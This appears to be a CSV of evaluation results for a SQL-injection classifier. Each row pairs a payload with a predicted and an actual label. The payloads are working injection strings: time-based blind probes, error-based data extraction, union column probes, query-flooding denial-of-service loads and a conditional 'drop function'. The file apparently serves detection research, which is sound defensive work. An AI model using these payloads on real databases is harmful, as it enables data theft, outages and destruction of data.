,Query,Prediction,Actual
5376,if  (  3593  =  3779  )   select 3593 else drop function qtqy--,1,1.0
5377,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   8535  =  8535",1,1.0
5378,if  (  8995  =  9787  )   select 8995 else drop function ofgg--,1,1.0
5379,"1""  )   rlike sleep  (  5  )   and   (  ""efoq"" like ""efoq",1,1.0
5380,"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'pydi' like 'pydi",1,1.0
5381,"1'+  (  select sshu where 3442  =  3442 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   +'",1,1.0
5382,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'inec'  =  'inec",1,1.0
5383, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   '%'  =  ',1,1.0
5384,"1""  )   as jscj where 2308  =  2308 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,1.0
5385,"1%'   )    )    and make_set  (  6527  =  9529,9529  )   and    (    (   '%'  =  '",1,1.0
5386,"1 where 5401  =  5401 and elt  (  1210  =  1210,sleep  (  5   )    )   --",1,1.0
5387,"1%'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  '%'  =  '",1,1.0
5388,"1%""   )    )    or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (   ""%""  =  """,1,1.0
5389,"1""   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   ""vdyr""  =  ""vdyr",1,1.0
5390,1'  )   and 4380  =  5851 and   (  'cxcl'  =  'cxcl,1,1.0
5391,-6757'   )    )     )   or 4524  =  3696,1,1.0
5392,"1  )   where 4810  =  4810 union all select null,null#",1,1.0
5393,-6586'   )    )    or 2021  =  2996,1,1.0
5394,"-4100'   )    )    union all select 1163,1163,1163--",1,1.0
5395,"-2216   )    )    as hxmq where 5677  =  5677 union all select 5677,5677--",1,1.0
5396,"1%""  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  ""%""  =  """,1,1.0
5397,"1'  )   where 7887  =  7887 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",1,1.0
5398,"-6942'  )   union all select 7280,7280,7280#",1,1.0
5399,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  +'",1,1.0
5400,"-6000""  )   where 1797  =  1797 union all select 1797,1797,1797,1797,1797,1797,1797,1797--",1,1.0
5401,"1   )    )     )   or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,1.0
5402,"-7876%'  )   union all select 3909,3909,3909,3909,3909#",1,1.0
5403,"1' union all select null,null,null,null,null,null#",1,1.0
5404,"1 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",1,1.0
5405,"1  )   as xuvz where 3061  =  3061 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,1.0
5406,"-9583%""   )    )    union all select 9349,9349,9349,9349,9349,9349,9349--",1,1.0
5407,"-5385"" union all select 4577,4577,4577,4577,4577,4577,4577#",1,1.0
5408,"1  )   where 5048  =  5048 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1,1.0
5409,"-4944%""   )    )    or make_set  (  1084  =  1988,1988  )   and    (    (   ""%""  =  """,1,1.0
5410,"1 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",1,1.0
5411,"-8707'  )   union all select 5609,5609,5609--",1,1.0
5412,"1"" and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  ",1,1.0
5413,"1""   )    )     )   union all select null,null,null,null,null,null#",1,1.0
5414,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'xemh'  =  'xemh",1,1.0
5415,if  (  9690  =  6491  )   select 9690 else drop function nyln--,1,1.0
5416,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'xcnj'  =  'xcnj",1,1.0
5417,"-1051""  )   where 6586  =  6586 or 6647  =  6738#",1,1.0
5418,1'+  (  select zmbu where 8685  =  8685 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )     )  +',1,1.0
5419,"1 where 5627  =  5627 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,1.0
5420,1 where 4949  =  4949,1,1.0
5421,"1  )   where 7881  =  7881 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1.0
5422,1'   )    )    waitfor delay '0:0:5' and    (    (   'amnf' like 'amnf,1,1.0
5423,"1  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",1,1.0
5424,"-7379 union all select 9813,9813,9813,9813,9813,9813,9813,9813--",1,1.0
5425,"select count  (  *  )   from generate_series  (  1,5000000  )   and 'fahy' like 'fahy",1,1.0
5426,"1""   )    )    as dcrk where 5164  =  5164 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,1.0
5427,-8745'  )   as xpwv where 8855  =  8855 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1,1.0
5428,"1   )    )     )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  4858  =  4858",1,1.0
5429,1  )   where 1203  =  1203 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1,1.0
5430,"-2418'||  (  select 'mdbt' from dual where 3026  =  3026 union all select 3026,3026,3026,3026,3026,3026,3026,3026,3026--",1,1.0
5431,1 where 3357  =  3357 and   (  9492  =  4334  )  *4334--,1,1.0
5432,"1%'   )    )    union all select null,null,null#",1,1.0
5433,"1%""   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""%""  =  """,1,1.0
5434,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  ""%""  =  """,1,1.0
5435,"1""   )    )    as tncm where 8203  =  8203 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1.0
5436,"1'   )    )     )   and make_set  (  6094  =  2929,2929  )   and    (    (     (  'gkyo'  =  'gkyo",1,1.0
5437,1'||  (  select 'feyg' from dual where 7734  =  7734 and 3843  =  6724#,1,1.0
5438,"1""   )    )     )   and 7533  =  7533 and    (    (     (  ""xopd""  =  ""xopd",1,1.0
5439,"1%""  )   and elt  (  7436  =  9874,9874  )   and   (  ""%""  =  """,1,1.0
5440,-2866'   )    )    or 4491  =  9429#,1,1.0
5441,"1'  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ",1,1.0
5442,end and    (    (   'pfrt'  =  'pfrt,1,1.0
5443,1  )   as ozga where 4002  =  4002 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,1,1.0
5444,"iif  (  7011  =  2522,1,1/0  )  ",1,1.0
5445,-4904'  )   as ogyu where 2821  =  2821 or 5982  =  1643,1,1.0
5446,-3339' or 8571  =  8571--,1,1.0
5447,"1%'   )    )    and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (   '%'  =  '",1,1.0
5448,"1"" or elt  (  6272  =  6272,sleep  (  5   )    )    and ""hvic"" like ""hvic",1,1.0
5449,1' and   (  3020  =  3020  )  *6703 and 'hnvf'  =  'hnvf,1,1.0
5450,"1' where 3125  =  3125   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",1,1.0
5451,"-6108'  )   union all select 2519,2519,2519,2519--",1,1.0
5452,"1""   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,1.0
5453,"1""  )   where 2839  =  2839 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1.0
5454,"-6848""   )    )    or 4071  =  5312",1,1.0
5455,"1""  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,1.0
5456,"1%'   )    )     )   union all select null,null,null,null,null,null,null,null,null--",1,1.0
5457, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  #,1,1.0
5458,1'+  (  select 'stsu' where 2386  =  2386 or sleep  (  5  )  #,1,1.0
5459,"1  )   where 9149  =  9149 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",1,1.0
5460,-5470'   )    )    or   (  8459  =  8459  )  *4906 and    (    (   'oeam'  =  'oeam,1,1.0
5461,1'||  (  select 'hlxd' from dual where 2615  =  2615 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ||',1,1.0
5462,-4583'  )   as evbo where 6055  =  6055 union all select 6055--,1,1.0
5463,"1%'   )    )     )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  '%'  =  '",1,1.0
5464,1'||  (  select 'kptj' from dual where 5123  =  5123,1,1.0
5465,"-3126   )    )    union all select 6718,6718,6718,6718,6718--",1,1.0
5466,"-7448 union all select 4072,4072#",1,1.0
5467,"1""   )    )    and 9800  =  8713",1,1.0
5468,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and 'fvda' like 'fvda",1,1.0
5469,"1' in boolean mode  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  #",1,1.0
5470,"-3194""   )    )     )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  ""erua""  =  ""erua",1,1.0
5471,"-4919  )   union all select 2608,2608,2608,2608,2608,2608#",1,1.0
5472,"1"" and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  ",1,1.0
5473,"-2434'   )    )     )   union all select 5509,5509,5509,5509,5509,5509,5509--",1,1.0
5474,"-7568""   )    )     )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  ""jxge"" like ""jxge",1,1.0
5475,"1"" where 7015  =  7015 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",1,1.0
5476,"1""  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  ""hbgv""  =  ""hbgv",1,1.0
5477,"-1869""   )    )     )   union all select 7122,7122,7122,7122,7122,7122,7122,7122,7122--",1,1.0
5478,-8004%'  )   or   (  2301  =  7504  )  *7504 and   (  '%'  =  ',1,1.0
5479,"iif  (  1378  =  6569,1,1/0  )  ",1,1.0
5480,"1,  (  select   (  case when   (  5726  =  5275  )   then 1 else 1/  (  select 0  )   end   )    )   ",1,1.0
5481,"1""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""blkt"" like ""blkt",1,1.0
5482,"-2605%'   )    )     )   union all select 4738,4738#",1,1.0
5483,"1%""   )    )     )   waitfor delay '0:0:5' and    (    (     (  ""%""  =  """,1,1.0
5484,"1'   )    )    or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (   'gydh'  =  'gydh",1,1.0
5485,"1' union all select null,null,null,null,null,null,null--",1,1.0
5486,5739-5738,0,1.0
5487,"-7296%'   )    )     )   union all select 9322,9322,9322,9322--",1,1.0
5488,select   (  case when   (  7033  =  1594  )   then 7033 else 7033*  (  select 7033 from information_schema.character_sets  )   end  )  #,1,1.0
5489,"1"" and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and ""qzzg"" like ""qzzg",1,1.0
5490,"1%"" and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",1,1.0
5491,"1'  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  ",1,1.0
5492,"-4044%"" or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""%""  =  """,1,1.0
5493,"1""   )    )    as nejd where 2885  =  2885",1,1.0
5494,-2745   )    )    as aywp where 9735  =  9735 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,1,1.0
5495,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  9847  =  9847",1,1.0
5496,"-1844""   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  ""abdw"" like ""abdw",1,1.0
5497,"-8651""  )   where 8391  =  8391 union all select 8391,8391#",1,1.0
5498,-4562'  )   or 3038  =  3038,1,1.0
5499,"1""  )   where 7840  =  7840 union all select null,null#",1,1.0
5500,"-7382'   )    )    or make_set  (  9425  =  4330,4330  )   and    (    (   'tvaz' like 'tvaz",1,1.0
5501,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""yobb"" like ""yobb",1,1.0
5502,"1' and elt  (  1210  =  1210,sleep  (  5   )    )   ",1,1.0
5503,"-9037%"" union all select 6583#",1,1.0
5504,"1"" where 7022  =  7022",1,1.0
5505,"-4285'   )    )     )   union all select 8819,8819,8819,8819,8819,8819,8819,8819#",1,1.0
5506,1 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   -- jduw,1,1.0
5507,"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and 'fsvr'  =  'fsvr",1,1.0
5508,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   ",1,1.0
5509,select case when 2948  =  7279 then 1 else null end--,1,1.0
5510,"-1964'  )   as ihsp where 6379  =  6379 or elt  (  6945  =  6165,6165  )  --",1,1.0
5511,"1%' union all select null,null,null--",1,1.0
5512,"1%""   )    )     )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""%""  =  """,1,1.0
5513,"-8133'  )   union all select 6417,6417,6417,6417,6417,6417,6417,6417--",1,1.0
5514,"-5396'||  (  select 'fjhd' from dual where 4019  =  4019 union all select 4019,4019,4019,4019#",1,1.0
